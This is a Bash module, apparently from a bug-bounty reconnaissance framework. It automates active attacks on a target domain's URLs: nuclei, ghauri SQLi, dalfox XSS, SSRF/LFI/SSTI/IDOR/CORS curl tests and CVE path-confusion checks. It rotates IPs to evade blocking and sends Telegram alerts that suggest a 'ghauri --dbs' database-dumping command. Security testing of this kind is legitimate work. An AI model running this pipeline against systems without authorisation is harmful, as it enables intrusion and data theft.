    _telegram_send "🌐 *CORS Misconfiguration*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📊 ${ACAO}
${ACAC:+🔑 ${ACAC}}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    db_add_finding "$DOMAIN_ID" "smart_cors" "$SEV" \
      "$URL" "cors" "$ACAO"
  fi
}

_test_nuclei_by_tags() {
  local URL="$1" TAGS="$2" DOMAIN_ID="$3" DOMAIN="$4"
  [[ -z "$TAGS" ]] && return
  [[ -z "$URL" ]] && return

  if ! command -v nuclei &>/dev/null; then return; fi

  log_info "  🔍 Nuclei [$TAGS]: $URL"
  local SEVERITY="${NUCLEI_SEVERITY:-medium,high,critical}"
  local PROXY_FLAG=""
  $PROXY_ACTIVE && PROXY_FLAG="-proxy ${PROXY_URL}"
  local SMART_NUCLEI_TIMEOUT="${SMART_NUCLEI_TIMEOUT:-120}"

  timeout "$SMART_NUCLEI_TIMEOUT" nuclei \
    -u "$URL" \
    -tags "$TAGS" \
    -severity "$SEVERITY" \
    -no-interactsh \
    -silent -jsonl \
    ${PROXY_FLAG} \
    2>/dev/null \
  | while IFS= read -r LINE; do
    [[ -z "$LINE" ]] && continue
    local TEMPLATE SEV HOST
    TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id',''))" 2>/dev/null)
    [[ -z "$TEMPLATE" ]] && continue
    SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','info'))" 2>/dev/null)
    HOST=$(echo "$LINE"     | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
    log_warn "  ⚡ [$SEV] $TEMPLATE @ $HOST"
    notify_nuclei_finding "$DOMAIN" "$TEMPLATE" "$SEV" "$HOST" "Smart scan KB"
    db_add_finding "$DOMAIN_ID" "smart_nuclei" "$SEV" "$HOST" "$TEMPLATE" "Smart KB tags: $TAGS"
  done
}

# ── Añadir URL a batch de nuclei por grupo de tags ───────────
_add_nuclei_target() {
  local TAGS="$1" URL="$2" NUCLEI_DIR="$3"
  [[ -z "$TAGS" || -z "$URL" || -z "$NUCLEI_DIR" ]] && return
  local SAFE_TAG
  SAFE_TAG=$(echo "$TAGS" | tr ',' '_' | tr -cd 'a-zA-Z0-9_-')
  echo "$URL" >> "$NUCLEI_DIR/${SAFE_TAG}.txt"
}

# ── Función principal ─────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 20 — $MODULE_DESC: $DOMAIN"

  if [[ ! -f "$KB_PATH" ]]; then
    log_warn "knowledge_base.json no encontrada en $KB_PATH"
    return
  fi

  # Proxy
  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check

  # Rotador de IPs — ghauri/dalfox usan IP nueva por ejecución
  source "${SCRIPT_DIR}/core/rotator.sh" 2>/dev/null || true

  # Validators compartidos (refactor 2026-05-09)
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true

  local TOTAL_TESTS=0
  local TOTAL_FINDINGS=0

  # In single-target mode, scope queries to the specific subdomain
  local ALIVE="$OUT_DIR/subs_alive.txt"
  local SINGLE_SUB=""
  if [[ -s "$ALIVE" && "$(wc -l < "$ALIVE" | tr -d ' ')" == "1" ]]; then
    SINGLE_SUB=$(head -1 "$ALIVE" | tr -d '[:space:]')
    log_info "Single-target mode: scoping smart scan to $SINGLE_SUB"
  fi

  # ── Obtener URLs con parámetros de la DB ───────────────────
  # url_params.url almacena la base sin query string (https://host/path)
  # urls.url almacena la URL completa (https://host/path?p=v)
  # El join correcto es: urls.url empieza por url_params.url seguido de '?'
  local PARAM_URLS
  if [[ -n "$SINGLE_SUB" ]]; then
    PARAM_URLS=$(sqlite3 "$DB_PATH" \
      "SELECT DISTINCT u.url || '|' || p.param_name
       FROM url_params p
       JOIN urls u ON (u.url = p.url OR u.url LIKE p.url || '?%')
       WHERE p.domain_id=${DOMAIN_ID} AND u.domain_id=${DOMAIN_ID}
         AND (u.url LIKE 'https://${SINGLE_SUB}/%' OR u.url LIKE 'https://${SINGLE_SUB}?%'
              OR u.url = 'https://${SINGLE_SUB}')
       LIMIT 500;" 2>/dev/null)
  else
    PARAM_URLS=$(sqlite3 "$DB_PATH" \
      "SELECT DISTINCT u.url || '|' || p.param_name
       FROM url_params p
       JOIN urls u ON (u.url = p.url OR u.url LIKE p.url || '?%')
       WHERE p.domain_id=${DOMAIN_ID} AND u.domain_id=${DOMAIN_ID}
       UNION
       SELECT url || '|' || param_name
       FROM url_params
       WHERE domain_id=${DOMAIN_ID}
       LIMIT 500;" 2>/dev/null)
  fi

  # URLs con params en la tabla urls aunque no estén en url_params
  # (descubiertas por js_analyzer, auth_crawler, etc. tras ejecutar módulo 15)
  local URLS_WITH_PARAMS
  if [[ -n "$SINGLE_SUB" ]]; then
    URLS_WITH_PARAMS=$(sqlite3 "$DB_PATH" \
      "SELECT url FROM urls
       WHERE domain_id=${DOMAIN_ID} AND url LIKE '%?%'
         AND (url LIKE 'https://${SINGLE_SUB}/%' OR url LIKE 'https://${SINGLE_SUB}?%'
              OR url = 'https://${SINGLE_SUB}')
       ORDER BY first_seen DESC LIMIT 300;" 2>/dev/null)
  else
    URLS_WITH_PARAMS=$(sqlite3 "$DB_PATH" \
      "SELECT url FROM urls
       WHERE domain_id=${DOMAIN_ID} AND url LIKE '%?%'
       ORDER BY first_seen DESC LIMIT 300;" 2>/dev/null)
  fi

  # ── Fase 1: Recolección (sin red) ─────────────────────────
  # Clasificar todos los targets antes de ejecutar nada.
  # Nuclei se batchia por grupo de tags → un solo arranque por grupo.
  # Tests curl se acumulan para ejecutar en paralelo.

  local SMART_TMP="$OUT_DIR/.smart_tmp"
  local NUCLEI_DIR="$SMART_TMP/nuclei"
  local CURL_TESTS="$SMART_TMP/curl_tests.txt"
  local GHAURI_TESTS="$SMART_TMP/ghauri_tests.txt"
  local DALFOX_TESTS="$SMART_TMP/dalfox_tests.txt"
  mkdir -p "$NUCLEI_DIR"
  > "$CURL_TESTS"; > "$GHAURI_TESTS"; > "$DALFOX_TESTS"

  log_info "Fase 1/2 — clasificando targets con KB (sin red)..."

  # Parámetros de bajo valor que no merecen testing (buscadores, analytics, CMS internos)
  local _SKIP_PARAMS_RE='^(lr|as_sitesearch|as_filetype|as_q|googleoff|utm_source|utm_medium|utm_campaign|utm_content|utm_term|gclid|fbclid|_ga|_gid|__scale|__t|_ts|_v|ver|version|v|format|mime|encoding|charset|lang$|locale$|authenticity_token|csrf_token|csrfmiddlewaretoken|_csrf|__requestverificationtoken|x-csrf-token|_token|nonce)$'

  while IFS='|' read -r URL PARAM; do
    [[ -z "$URL" || -z "$PARAM" ]] && continue
    # Ignorar parámetros de bajo valor (analytics, encoding, CMS internos)
    echo "$PARAM" | grep -qiP "$_SKIP_PARAMS_RE" && continue

    # Extraer valor actual del parámetro de la URL
    local PVAL
    PVAL=$(echo "$URL" | grep -oP "(?<=${PARAM//./\\.}=)[^&]+" 2>/dev/null | head -1)
    PVAL=$(python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" <<< "$PVAL" 2>/dev/null)

    # Clasificar por nombre + valor (inteligente)
    local MATCHES
    MATCHES=$(_kb_match_param "$PARAM" "$PVAL")
    [[ -z "$MATCHES" ]] && continue
    ((TOTAL_TESTS++))

    for VULN_ID in $MATCHES; do
      local TAGS
      TAGS=$(_kb_get_nuclei_tags "$VULN_ID")
      case "$VULN_ID" in
        SSRF)          echo "SSRF|${URL}|${PARAM}"            >> "$CURL_TESTS" ;;
        OPEN_REDIRECT) echo "OR|${URL}|${PARAM}"              >> "$CURL_TESTS" ;;
        SSTI)          echo "SSTI|${URL}|${PARAM}"            >> "$CURL_TESTS" ;;
        LFI)           echo "LFI|${URL}|${PARAM}"             >> "$CURL_TESTS" ;;
        SQLI)
          # Bug #16: skip URLs sintéticas (.vue/.tsx/etc + framework keywords) y catch-all hosts
          is_synthetic_endpoint "$URL" "$PARAM" 2>/dev/null && continue
          local _SQLI_HOST
          _SQLI_HOST=$(echo "$URL" | grep -oP 'https?://[^/?#]+')
          is_catchall_host "$_SQLI_HOST" 2>/dev/null && continue
          if command -v ghauri &>/dev/null; then
            echo "${URL}|${PARAM}" >> "$GHAURI_TESTS"
          else
            _add_nuclei_target "${TAGS:-sqli}" "$URL" "$NUCLEI_DIR"
          fi ;;
        XSS_STORED)
          is_synthetic_endpoint "$URL" "$PARAM" 2>/dev/null && continue
          local _XSS_HOST
          _XSS_HOST=$(echo "$URL" | grep -oP 'https?://[^/?#]+')
          is_catchall_host "$_XSS_HOST" 2>/dev/null && continue
          if command -v dalfox &>/dev/null; then
            echo "${URL}|${PARAM}" >> "$DALFOX_TESTS"
          else
            _add_nuclei_target "${TAGS:-xss}" "$URL" "$NUCLEI_DIR"
          fi ;;
        IDOR)
          [[ -n "$PVAL" ]] && echo "IDOR|${URL}|${PARAM}|${PVAL}" >> "$CURL_TESTS" ;;
        *)
          _add_nuclei_target "$TAGS" "$URL" "$NUCLEI_DIR" ;;
      esac
    done
  done <<< "$PARAM_URLS"

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    local PATH_PART
    PATH_PART=$(echo "$URL" | sed 's|https\?://[^/]*||;s|?.*||')
    local PATH_MATCHES
    PATH_MATCHES=$(_kb_match_path "$PATH_PART")
    [[ -z "$PATH_MATCHES" ]] && continue
    ((TOTAL_TESTS++))

    for VULN_ID in $PATH_MATCHES; do
      local TAGS
      TAGS=$(_kb_get_nuclei_tags "$VULN_ID")
      case "$VULN_ID" in
        CORS) echo "CORS|${URL}|" >> "$CURL_TESTS" ;;
        *)    _add_nuclei_target "${TAGS:-$VULN_ID}" "$URL" "$NUCLEI_DIR" ;;
      esac
    done
  done <<< "$URLS_WITH_PARAMS"

  # CORS sobre subdominios alive
  local ALIVE="$OUT_DIR/subs_alive.txt"
  if [[ -s "$ALIVE" ]]; then
    while IFS= read -r SUB; do
      [[ -z "$SUB" ]] && continue
      echo "CORS|https://${SUB}|" >> "$CURL_TESTS"
    done < "$ALIVE"
  fi

  # ── Fase 2a: Nuclei en batch (un arranque por grupo de tags) ─
  local SEVERITY="${NUCLEI_SEVERITY:-medium,high,critical}"
  local PROXY_FLAG=""
  $PROXY_ACTIVE && PROXY_FLAG="-proxy ${PROXY_URL}"

  # Tags que operan a nivel de host (no necesitan cada URL del host)
  local HOST_LEVEL_TAGS='cache|misconfig|headers|cors|cve|exposure'
  # Timeout por batch: 8 min para tags amplias, 4 min para el resto
  local BATCH_TIMEOUT_BROAD=480
  local BATCH_TIMEOUT_NORMAL=240

  if command -v nuclei &>/dev/null; then
    for NUC_FILE in "$NUCLEI_DIR"/*.txt; do
      [[ -f "$NUC_FILE" ]] || continue
      TAGS_KEY=$(basename "$NUC_FILE" .txt | tr '_' ',')

      # Para tags de nivel host: deduplicar a un único origen por host
      if echo "$TAGS_KEY" | grep -qiP "$HOST_LEVEL_TAGS"; then
        local HOST_DEDUP="$NUC_FILE.hosts"
        sed 's|https\?://||;s|[:/].*||' "$NUC_FILE" \
          | sort -u \
          | sed 's|^|https://|' > "$HOST_DEDUP"
        # Cap: max 50 hosts para evitar batches infinitos
        head -50 "$HOST_DEDUP" > "$NUC_FILE"
        rm -f "$HOST_DEDUP"
        BATCH_TIMEOUT="$BATCH_TIMEOUT_BROAD"
      else
        sort -u "$NUC_FILE" -o "$NUC_FILE"
        head -100 "$NUC_FILE" | sponge "$NUC_FILE" 2>/dev/null || \
          { local TMP_F; TMP_F=$(head -100 "$NUC_FILE"); echo "$TMP_F" > "$NUC_FILE"; }
        BATCH_TIMEOUT="$BATCH_TIMEOUT_NORMAL"
      fi

      local NUC_COUNT
      NUC_COUNT=$(wc -l < "$NUC_FILE" | tr -d ' ')
      log_info "nuclei [$TAGS_KEY] → $NUC_COUNT targets (batch, timeout ${BATCH_TIMEOUT}s)..."

      timeout "$BATCH_TIMEOUT" nuclei \
        -l "$NUC_FILE" \
        -tags "$TAGS_KEY" \
        -severity "$SEVERITY" \
        -silent -jsonl \
        -timeout 10 \
        -rl 50 -c 15 \
        -max-host-error 3 \
        ${PROXY_FLAG} \
        2>/dev/null \
      | while IFS= read -r LINE; do
          [[ -z "$LINE" ]] && continue
          local TEMPLATE SEV HOST
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id',''))" 2>/dev/null)
          [[ -z "$TEMPLATE" ]] && continue
          SEV=$(echo "$LINE"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','info'))" 2>/dev/null)
          HOST=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
          log_warn "  ⚡ [$SEV] $TEMPLATE @ $HOST"
          notify_nuclei_finding "$DOMAIN" "$TEMPLATE" "$SEV" "$HOST" "Smart scan KB"
          db_add_finding "$DOMAIN_ID" "smart_nuclei" "$SEV" "$HOST" "$TEMPLATE" "Smart KB tags: $TAGS_KEY"
        done || log_warn "nuclei [$TAGS_KEY] timeout tras ${BATCH_TIMEOUT}s — continuando"
    done
  fi

  # ── Fase 2b: Tests curl en paralelo (max 10 workers) ────────
  local CURL_COUNT
  CURL_COUNT=$(wc -l < "$CURL_TESTS" | tr -d ' ')
  log_info "Tests curl: $CURL_COUNT en paralelo (10 workers)..."

  local PIDS=() MAX_CURL=10
  while IFS='|' read -r TYPE URL PARAM EXTRA; do
    [[ -z "$TYPE" || -z "$URL" ]] && continue
    (
      case "$TYPE" in
        SSRF) _test_ssrf          "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" ;;
        OR)   _test_open_redirect "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" ;;
        SSTI) _test_ssti          "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" ;;
        LFI)  _test_lfi           "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" ;;
        IDOR) _test_idor          "$URL" "$PARAM" "$EXTRA"     "$DOMAIN_ID" "$DOMAIN" ;;
        CORS) _test_cors          "$URL" "$DOMAIN_ID" "$DOMAIN" ;;
      esac
    ) &
    PIDS+=($!)
    if [[ ${#PIDS[@]} -ge $MAX_CURL ]]; then
      wait "${PIDS[0]}" 2>/dev/null || true
      PIDS=("${PIDS[@]:1}")
    fi
  done < "$CURL_TESTS"
  wait "${PIDS[@]}" 2>/dev/null || true

  # ── Fase 2c: Ghauri SQLi (paralelo, 5 workers, 120s por target) ──
  if [[ -s "$GHAURI_TESTS" ]]; then
    # Dedup por URL base (pre-?) + nombre de param — evitar el mismo endpoint N veces
    awk -F'|' 'BEGIN{} {base=$1; sub(/\?.*/, "", base); key=base"|"$2; if(!seen[key]++) print}' \
      "$GHAURI_TESTS" > "$SMART_TMP/.ghauri_dedup" && mv "$SMART_TMP/.ghauri_dedup" "$GHAURI_TESTS"
    # Cap: max 50 targets
    { head -50 "$GHAURI_TESTS" > "$SMART_TMP/.ghauri_cap"; mv "$SMART_TMP/.ghauri_cap" "$GHAURI_TESTS"; } 2>/dev/null || true
    local GHAURI_COUNT
    GHAURI_COUNT=$(wc -l < "$GHAURI_TESTS" | tr -d ' ')
    log_info "ghauri SQLi: $GHAURI_COUNT targets (5 workers, 120s/target)..."

    local GPIDS=() MAX_G=5
    while IFS='|' read -r URL PARAM; do
      [[ -z "$URL" || -z "$PARAM" ]] && continue
      # Usar solo la base URL — quitar query string para construir URL limpia
      local GBASE="${URL%%\?*}"
      local GOUT="$SMART_TMP/ghauri_${PARAM}_$RANDOM.txt"
      (
        log_info "  🔍 ghauri: ${GBASE}?${PARAM}=1"
        timeout 120 ghauri \
          -u "${GBASE}?${PARAM}=1" \
          --level 1 --batch --timeout 15 \
          --silent 2>/dev/null > "$GOUT" || true
        if grep -qi "injectable\|vulnerable\|injection found" "$GOUT" 2>/dev/null; then
          log_warn "  ⚡ SQLi confirmado: ${GBASE}?${PARAM}"
          db_add_finding "$DOMAIN_ID" "smart_sqli" "critical" \
            "$GBASE" "ghauri" "Param '$PARAM' inyectable (ghauri)"
          _telegram_send "💉 *SQLi — ghauri*
🌐 \`${DOMAIN}\`
🔗 \`${GBASE}\`
📝 Param: \`${PARAM}\`
🔴 Confirmado — explotar con: ghauri -u '${GBASE}?${PARAM}=1' --dbs
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
        fi
        rm -f "$GOUT"
      ) &
      GPIDS+=($!)
      if [[ ${#GPIDS[@]} -ge $MAX_G ]]; then
        wait "${GPIDS[0]}" 2>/dev/null || true
        GPIDS=("${GPIDS[@]:1}")
      fi
    done < "$GHAURI_TESTS"
    wait "${GPIDS[@]}" 2>/dev/null || true
  fi

  # ── Fase 2d: Dalfox XSS (paralelo, 10 workers, 60s por target) ─
  if [[ -s "$DALFOX_TESTS" ]]; then
    # Dedup por URL base + param — igual que ghauri
    awk -F'|' 'BEGIN{} {base=$1; sub(/\?.*/, "", base); key=base"|"$2; if(!seen[key]++) print}' \
      "$DALFOX_TESTS" > "$SMART_TMP/.dalfox_dedup" && mv "$SMART_TMP/.dalfox_dedup" "$DALFOX_TESTS"
    # Cap: max 100 targets
    { head -100 "$DALFOX_TESTS" > "$SMART_TMP/.dalfox_cap"; mv "$SMART_TMP/.dalfox_cap" "$DALFOX_TESTS"; } 2>/dev/null || true
    local DALFOX_COUNT
    DALFOX_COUNT=$(wc -l < "$DALFOX_TESTS" | tr -d ' ')
    log_info "dalfox XSS: $DALFOX_COUNT targets (10 workers, 60s/target)..."

    local DPIDS=() MAX_D=10
    while IFS='|' read -r URL PARAM; do
      [[ -z "$URL" || -z "$PARAM" ]] && continue
      local DBASE="${URL%%\?*}"
      local DOUT="$SMART_TMP/dalfox_${PARAM}_$RANDOM.txt"
      (
        log_info "  🔍 dalfox: ${DBASE}?${PARAM}"
        timeout 60 dalfox url "${DBASE}?${PARAM}=FUZZ" \
          --silence --only-poc g --skip-mining-dom \
          2>/dev/null > "$DOUT" || true
        if [[ -s "$DOUT" ]]; then
          local POC; POC=$(head -1 "$DOUT")
          log_warn "  ⚡ XSS confirmado: ${DBASE}?${PARAM}"
          db_add_finding "$DOMAIN_ID" "smart_xss" "high" \
            "$DBASE" "dalfox" "XSS en '$PARAM' — PoC: ${POC:0:200}"
          _telegram_send "🔴 *XSS — dalfox*
🌐 \`${DOMAIN}\`
🔗 \`${DBASE}\`
📝 Param: \`${PARAM}\`
💉 PoC: \`${POC:0:200}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
        fi
        rm -f "$DOUT"
      ) &
      DPIDS+=($!)
      if [[ ${#DPIDS[@]} -ge $MAX_D ]]; then
        wait "${DPIDS[0]}" 2>/dev/null || true
        DPIDS=("${DPIDS[@]:1}")
      fi
    done < "$DALFOX_TESTS"
    wait "${DPIDS[@]}" 2>/dev/null || true
  fi

  rm -rf "$SMART_TMP"

  # ── Fase 2e: Tech-based KB matching (nuclei por tecnología detectada) ──
  # Se ejecuta aunque la detección de tech sea parcial o incompleta.
  # Para cada tech detectada en la DB, lanzamos los nuclei tags correspondientes.
  log_info "Fase 2e — tech-based nuclei (independiente de reconocimiento)..."
  local TECH_NUCLEI_TMP="$OUT_DIR/.smart_tech_nuclei"
  mkdir -p "$TECH_NUCLEI_TMP"

  local DETECTED_TECHS
  DETECTED_TECHS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT tech_name FROM technologies
     WHERE domain_id=${DOMAIN_ID};" 2>/dev/null)

  # Fallback: aunque no haya techs detectadas, siempre lanzar path confusion
  # porque Tomcat/Spring pueden pasar desapercibidos si httpx no los identifica
  local TECH_HOSTS="$TECH_NUCLEI_TMP/hosts.txt"
  if [[ -n "$SINGLE_SUB" ]]; then
    echo "https://${SINGLE_SUB}" > "$TECH_HOSTS"
  elif [[ -s "$ALIVE" ]]; then
    sed 's|^|https://|' "$ALIVE" > "$TECH_HOSTS"
  fi

  if [[ -s "$TECH_HOSTS" ]]; then
    local ALL_TECH_TAGS=""
    while IFS= read -r TECH; do
      [[ -z "$TECH" ]] && continue
      local TECH_TAGS
      TECH_TAGS=$(_kb_match_tech "$TECH")
      for TID in $TECH_TAGS; do
        local TTAGS
        TTAGS=$(_kb_get_nuclei_tags "$TID")
        [[ -n "$TTAGS" ]] && ALL_TECH_TAGS="${ALL_TECH_TAGS},${TTAGS}"
      done
    done <<< "$DETECTED_TECHS"

    # Siempre incluir tags de path confusion — no depender de detección de tech
    ALL_TECH_TAGS="${ALL_TECH_TAGS},tomcat,spring,apache,cve-2025-24813,cve-2025-55752,cve-2024-38819,cve-2024-38816,cve-2024-38475,cve-2024-38476"
    # Limpiar: quitar comas duplicadas y al inicio
    ALL_TECH_TAGS=$(echo "$ALL_TECH_TAGS" | tr ',' '\n' | sort -u | grep -v '^$' | tr '\n' ',' | sed 's/,$//')

    if [[ -n "$ALL_TECH_TAGS" ]] && command -v nuclei &>/dev/null; then
      log_info "  nuclei tech+confusion tags: $ALL_TECH_TAGS → $(wc -l < "$TECH_HOSTS" | tr -d ' ') hosts"
      timeout 480 nuclei \
        -l "$TECH_HOSTS" \
        -tags "$ALL_TECH_TAGS" \
        -severity "${NUCLEI_SEVERITY:-medium,high,critical}" \
        -silent -jsonl \
        -timeout 10 -rl 30 -c 10 \
        -max-host-error 3 \
        ${PROXY_FLAG:-} \
        2>/dev/null \
      | while IFS= read -r LINE; do
          [[ -z "$LINE" ]] && continue
          local TEMPLATE SEV HOST
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id',''))" 2>/dev/null)
          [[ -z "$TEMPLATE" ]] && continue
          SEV=$(echo "$LINE"  | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','info'))" 2>/dev/null)
          HOST=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
          log_warn "  ⚡ [tech] [$SEV] $TEMPLATE @ $HOST"
          notify_nuclei_finding "$DOMAIN" "$TEMPLATE" "$SEV" "$HOST" "Tech-based"
          db_add_finding "$DOMAIN_ID" "smart_tech" "$SEV" "$HOST" "$TEMPLATE" "Tech tags: $ALL_TECH_TAGS"
        done || log_warn "  nuclei tech-based timeout"
    fi
  fi

  # ── Fase 2f: Path confusion directo (Orange Tsai) ─────────
  # Se lanza sobre TODOS los hosts independientemente de tech detectada.
  log_info "Fase 2f — path confusion (Orange Tsai), universal..."
  if [[ -s "$TECH_HOSTS" ]]; then
    local PC_PIDS=() MAX_PC=5
    while IFS= read -r HOST_URL; do
      [[ -z "$HOST_URL" ]] && continue
      (
        _test_path_confusion "$HOST_URL" "$DOMAIN_ID" "$DOMAIN"
      ) &
      PC_PIDS+=($!)
      if [[ ${#PC_PIDS[@]} -ge $MAX_PC ]]; then
        wait "${PC_PIDS[0]}" 2>/dev/null || true
        PC_PIDS=("${PC_PIDS[@]:1}")
      fi
    done < "$TECH_HOSTS"
    wait "${PC_PIDS[@]}" 2>/dev/null || true
  fi

  rm -rf "$TECH_NUCLEI_TMP"

  TOTAL_FINDINGS=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type LIKE 'smart_%';" 2>/dev/null || echo 0)
  local PATH_CONFUSION_FINDINGS
  PATH_CONFUSION_FINDINGS=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='path_confusion';" 2>/dev/null || echo 0)

  log_ok "$MODULE_DESC completado: $TOTAL_TESTS targets analizados, $TOTAL_FINDINGS smart findings, $PATH_CONFUSION_FINDINGS path confusion"
}
